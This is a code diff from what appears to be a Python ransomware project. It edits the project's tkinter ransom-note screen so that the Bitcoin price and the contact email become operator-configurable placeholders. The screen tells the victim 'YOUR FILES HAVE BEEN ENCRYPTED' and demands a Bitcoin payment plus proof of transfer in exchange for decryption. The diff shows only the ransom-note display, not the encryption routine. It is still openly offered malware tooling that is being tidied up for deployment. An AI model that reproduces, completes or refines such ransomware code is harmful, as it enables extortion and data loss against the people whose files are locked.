@@ -116,6 +116,10 @@ def spam_messagebox():
 
     BTC_ADDRESS = "YOUR_BTC_ADDRESS_HERE"
 
+    EMAIL_ADDRESS = "YOUR_EMAIL_HERE"
+
+    RANSOMWARE_PRICE = "YOUR_PRICE_HERE"
+
     label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
     label1.config(font=('helvetica', int(height/20)))
     label1.config(background='black', foreground='red')
@@ -146,7 +150,7 @@ def spam_messagebox():
     canvas1.create_window(int(width/2), int(height/20)*9, window=label1)
 
 
-    label1 = tk.Label(root, text='to decrypt them, send 150$ in BITCOIN to') # Blackmail ammount
+    label1 = tk.Label(root, text=f'to decrypt them, send {RANSOMWARE_PRICE} in BITCOIN to') # Blackmail ammount
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
@@ -158,7 +162,7 @@ def spam_messagebox():
     canvas1.create_window(int(width/2), int(height/20)*13, window=labelBTC)
                                                 # *13 means how far down the canvas the subtitle is!
 
-    label1 = tk.Label(root, text=f'and then send proof of transfer to YOUR_EMAIL_HERE to get your files decrypted') # Change mail@mail.com to your contact name
+    label1 = tk.Label(root, text=f'and then send proof of transfer to {EMAIL_ADDRESS} to get your files decrypted') # Change mail@mail.com to your contact name
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*15, window=label1)
